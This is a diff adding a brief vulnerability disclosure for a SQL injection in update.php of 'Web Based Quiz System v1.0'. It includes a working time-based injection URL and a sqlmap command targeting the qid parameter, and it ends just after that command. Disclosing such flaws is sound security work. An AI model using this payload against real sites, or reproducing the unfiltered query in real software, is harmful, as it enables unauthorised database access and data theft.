@@ -1,0 +1,17 @@
+Web Based Quiz System v1.0 is vulnerable to SQL Injection via update.php
+Exploit Title: SQL injection
+Date: 2022-07-06
+Software Link: https://www.sourcecodester.com/download-code?nid=14727&title=Web+Based+Quiz+System+in+PHP%2FMySQLi+with+Full+Source+Code
+Version: v1.0
+Tested on: Linux   Apache/2.4.38   MariaDB 10.3.34   php7.2.20
+1. Vulnerability analysis
+The file path that exists in vulnerabilities is: /update.php, the sql statement used by mysqli_query(line 98) did not filter the qid parameter which is input by user, and brought it directly into the database to query, resulting in a SQL injection vulnerability:
+2. POC
+Triggering this vulnerability did not need any cookie, just GET update.php like this:
+http://vps:9999/update.php?q=quiz&step=2&qid=1'+union+select+1,(select+sleep(2));--+
+and the server will response after 2 seconds（about 2000 milis）
+the sqlmap command and result as follows:
+Plain Text
+复制代码
+1
+sqlmap -u http://vps:9999/update.php\?q\=quiz\&step\=2\&qid\=1 -p qid --technique=T
